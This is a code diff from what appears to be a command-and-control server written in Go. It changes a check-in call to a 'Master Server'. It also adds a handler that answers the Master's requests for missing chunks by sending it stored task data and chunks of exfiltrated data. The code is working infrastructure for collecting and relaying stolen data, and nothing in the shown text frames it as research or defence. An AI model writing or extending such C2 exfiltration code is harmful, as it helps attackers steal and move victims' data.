@@ -821,7 +821,7 @@ func main() {
 		"startup_time": time.Now().Unix(),
 	}
 
-	_, _, _, err = masterClient.Checkin(stats)
+	_, _, _, _, err = masterClient.Checkin(stats)
 	if err != nil {
 		LogWarn("Initial checkin to Master Server failed: %v", err)
 		LogInfo("Continuing in resilient mode (will retry in background)")
@@ -907,6 +907,35 @@ func main() {
 				if session.Status != "completed" {
 					LogDebug("Marking exfil session %s as completed (synced from Master)", sessionID)
 					c2Manager.finalizeExfilSession(session)
+				}
+			}
+		}
+	}, func(missingChunks []MissingChunkRequest) {
+		// Handle missing chunk requests from Master
+		if len(missingChunks) == 0 {
+			return
+		}
+
+		LogDebug("Received %d missing chunk request(s) from Master", len(missingChunks))
+
+		for _, req := range missingChunks {
+			if req.Type == "task" {
+				// Get local chunks for this task and send to Master
+				chunks := c2Manager.db.GetLocalTaskChunks(req.ID, req.MissingChunks)
+				if len(chunks) > 0 {
+					LogDebug("Sending %d missing chunks for task %s to Master", len(chunks), req.ID)
+					if err := masterClient.SendMissingChunks(req.ID, "task", chunks); err != nil {
+						LogError("Failed to send missing chunks for task %s: %v", req.ID, err)
+					}
+				}
+			} else if req.Type == "exfil" {
+				// Get local chunks for this exfil session and send to Master
+				chunks := c2Manager.db.GetLocalExfilChunks(req.ID, req.MissingChunks)
+				if len(chunks) > 0 {
+					LogDebug("Sending %d missing exfil chunks for session %s to Master", len(chunks), req.ID)
+					if err := masterClient.SendMissingChunks(req.ID, "exfil", chunks); err != nil {
+						LogError("Failed to send missing exfil chunks for session %s: %v", req.ID, err)
+					}
 				}
 			}
 		}
